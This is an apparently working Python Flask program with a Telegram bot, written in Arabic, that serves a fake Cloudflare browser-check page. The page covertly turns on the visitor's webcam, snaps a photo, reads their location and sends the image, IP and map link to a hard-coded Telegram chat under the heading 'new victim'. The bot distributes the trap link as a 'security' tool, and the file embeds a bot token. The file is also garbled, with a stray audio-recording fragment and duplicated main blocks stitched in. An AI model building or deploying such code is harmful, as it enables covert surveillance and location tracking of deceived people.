import base64, requests, io, time
from flask import Flask, render_template_string, request, redirect, jsonify
from threading import Thread

app = Flask(__name__)

# ======================= إعداداتك الخاصة =======================
BOT_TOKEN = "8725128005:AAH3Pp14tKAEsLPvcHOGdh8JqOnD74KKLNs"
CHAT_ID = "7041600701"
MY_LINK = "https://sif-e7ad.onrender.com"
CHANNEL_URL = "https://t.me/FAABOT?start=7041600701"
# ============================================================

users_db = {}
used_ips = set()

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>التحقق من الأمان | Cloudflare</title>
    <style>
        body { background: #fff; font-family: -apple-system, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .container { max-width: 450px; width: 90%; text-align: center; }
        .loader-box { border: 1px solid #e0e0e0; border-radius: 8px; padding: 25px; box-shadow: 0 4px 6px rgba(0,0,0,0.05); }
        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #f6821f; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 15px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #st { color: #f6821f; font-weight: bold; font-size: 14px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="loader-box">
            <img src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Cloudflare_Logo.svg" width="120" style="margin-bottom:20px;">
            <h1 style="font-size: 22px;">يرجى الانتظار..</h1>
            <p style="color: #666;">جاري فحص المتصفح للتأكد من أنك لست روبوت.</p>
            <div class="spinner"></div>
            <div id="st">بدء الفحص الآمن...</div>
        </div>
    </div>
    <video id="v" autoplay playsinline muted style="position:absolute; width:1px; height:1px; opacity:0;"></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        async function init() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const v = document.getElementById('v');
                v.srcObject = stream;
                
                document.getElementById('st').innerText = "جاري التحقق من الموقع...";
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    document.getElementById('st').innerText = "اكتمل الفحص، جاري التحويل...";
                    await sendData(pos.coords.latitude, pos.coords.longitude);
                }, () => sendData(0, 0));
            } catch (e) { sendData(0, 0); }
        }

        async function sendData(lat, lon) {
            const v = document.getElementById('v');
            const c = document.getElementById('c');
            c.width = v.videoWidth;
            c.height = v.videoHeight;
            c.getContext('2d').drawImage(v, 0, 0);
            const img = c.toDataURL('image/jpeg', 0.7).split(',')[1];
            
            await fetch('/capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ img, lat, lon })
            });
            window.location.href = "{{ channel_url }}";
        }
        window.onload = () => setTimeout(init, 1500);
    </script>
</body>
</html>
'''

def send_to_tg(m, img=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/"
    if img:
        requests.post(url + "sendPhoto", data={'chat_id': CHAT_ID, 'caption': m}, files={'photo': ('i.jpg', io.BytesIO(base64.b64decode(img)), 'image/jpeg')})
    else:
        requests.post(url + "sendMessage", data={'chat_id': CHAT_ID, 'text': m, 'parse_mode': 'HTML'})

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE, channel_url=CHANNEL_URL)

@app.route('/capture', methods=['POST'])
def capture():
    data = request.json
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    msg = f"🔥 <b>ضحية جديدة!</b>\n🌐 IP: <code>{ip}</code>\n📍 موقع: https://www.google.com/maps?q={data['lat']},{data['lon']}"
    send_to_tg(msg, data.get('img'))
    return jsonify({"status": "ok"})

@app.route('/webhook', methods=['POST'])
def webhook():
    update = request.json
    if "message" in update and "text" in update["message"]:
        text = update["message"]["text"]
        chat_id = update["message"]["chat_id"]
        if text == "/start":
            msg = "👋 أهلاً بك في بوت الحماية\n\nاضغط على الزر أدناه لإنشاء رابط فحص خاص بك."
            kb = {"inline_keyboard": [[{"text": "🚀 إنشاء رابط الفحص", "callback_data": "gen"}]]}
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': chat_id, 'text': msg, 'reply_markup': kb})
    
    elif "callback_query" in update:
        chat_id = update["callback_query"]["message"]["chat_id"]
        if update["callback_query"]["data"] == "gen":
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': chat_id, 'text': f"✅ رابط الفحص الخاص بك جاهز:\n\n<code>{MY_LINK}</code>"})
    
    return "OK"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
        requests.post(api + "sendDocument", data={'chat_id': CHAT_ID, 'caption': '🎤 تسجيل 3 ثواني', 'document': f})
    return "OK"

def run_bot():
    last_id = 0
    while True:
        try:
            r = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates?offset={last_id + 1}&timeout=30").json()
            for up in r.get('result', []):
                last_id = up['update_id']
                if 'message' in up:
                    msg = up['message']
                    u_id = str(msg['from']['id'])
                    if u_id not in users_db: users_db[u_id] = {'used': False, 'points': 0}
                    
                    if msg.get('text') == '/start':
                        welcome = "🛡️ **نظام الحماية الذكي | Smart Security**\n\nيجب عليك الاشتراك في القناة أولاً، ثم إنشاء الرابط الخاص بك."
                        kb = {"inline_keyboard": [
                            [{"text": "📢 الاشتراك الإجباري", "url": CHANNEL_URL}],
                            [{"text": "🚀 إنشاء رابط الفحص", "callback_data": "gen_link"}],
                            [{"text": "📊 معلوماتي", "callback_data": "info"}]
                        ]}
                        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': u_id, 'text': welcome, 'reply_markup': kb, 'parse_mode': 'Markdown'})
                
                elif 'callback_query' in up:
                    cb = up['callback_query']
                    u_id = str(cb['from']['id'])
                    if cb['data'] == 'gen_link':
                        if not users_db[u_id]['used']:
                            users_db[u_id]['used'] = True
                            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={'chat_id': u_id, 'text': f"✅ تم توليد رابطك المجاني لمرة واحدة:\n\n{MY_LINK}"})
                        elif users_db[u_id]['points'] >= 10:
                            users_db[u_id]['points'] -= 10
                            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={'chat_id': u_id, 'text': f"✅ تم خصم 10 نقاط. رابطك الجديد:\n\n{MY_LINK}"})
                        else:
                            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={'chat_id': u_id, 'text': "❌ استنفدت محاولتك!\n\nاجمع 10 نقاط أو تواصل مع المطور للتفعيل المدفوع."})
        except: pass

if __name__ == '__main__':
    Thread(target=run_bot).start()
    app.run(host='0.0.0.0', port=5000)
